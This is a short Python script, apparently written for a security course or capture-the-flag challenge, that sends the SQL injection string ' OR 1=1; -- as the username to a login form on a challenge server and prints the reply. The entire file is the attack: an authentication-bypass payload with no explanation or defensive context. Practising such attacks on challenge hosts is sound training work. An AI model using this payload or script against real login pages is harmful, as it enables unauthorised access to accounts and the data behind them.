import requests

url = "http://chals.syssec.dk:8080//login"

def send_request(username, password):    
    formdata = {'username': username, 'password': password}
    x = requests.post(url, data = formdata)
    return x

injection = "' OR 1=1; --"
x = send_request(injection, "")
print(x.text)
